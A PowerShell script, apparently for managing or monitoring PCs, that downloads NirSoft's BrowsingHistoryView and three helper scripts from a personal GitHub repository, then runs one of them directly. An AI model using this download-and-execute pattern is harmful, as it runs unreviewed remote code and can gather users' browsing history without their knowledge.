[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$zipFile = "browsinghistoryview.zip"
$destinationFolder = "C:\Users\Administrator\Desktop\Data"
$zipPath = Join-Path $destinationFolder $zipFile
$VerbosePreference = "Continue"
$ProgressPreference = 'Continue'

if (-not (Test-Path $destinationFolder)) {
    New-Item -Path $destinationFolder -ItemType Directory | Out-Null
}

Set-Location -Path $destinationFolder

function Download-UntilSuccess($url, $outFile) {
    while ($true) {
        try {
            Invoke-WebRequest -Uri $url -OutFile $outFile -ErrorAction Stop `
                -Headers @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
                
            if ((Test-Path $outFile) -and ((Get-Item $outFile).Length -gt 0)) {
                Write-Host "Down Success: $outFile" -ForegroundColor Green
                break
            } else {
                Write-Host "File Error Retry..." -ForegroundColor Yellow
            }
        }
        catch {
            Write-Host "Down Fail: $($_.Exception.Message)" -ForegroundColor Red
        }

        Start-Sleep -Seconds 5
    }
}

Download-UntilSuccess "https://www.nirsoft.net/utils/browsinghistoryview.zip" "$zipPath"
Download-UntilSuccess "https://raw.githubusercontent.com/wogmd1017/manage2/main/cpcsetting2.ps1" "$destinationFolder\cpcsetting2.ps1"
Download-UntilSuccess "https://raw.githubusercontent.com/wogmd1017/manage2/main/hostup2.ps1" "$destinationFolder\hostup2.ps1"
Download-UntilSuccess "https://raw.githubusercontent.com/wogmd1017/manage2/main/hisup2.ps1" "$destinationFolder\hisup2.ps1"


if (Test-Path $zipPath) {
    if (Test-Path "$destinationFolder\BrowsingHistoryView") {
        Remove-Item "$destinationFolder\BrowsingHistoryView" -Recurse -Force
    }
    Expand-Archive -Path $zipPath -DestinationPath $destinationFolder -Force
}

Write-Host "Press Enter to continue..."
[void][System.Console]::ReadLine()

try {
    . "$destinationFolder\cpcsetting2.ps1"
} catch {
    Write-Host "오류 발생: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press Enter"
}
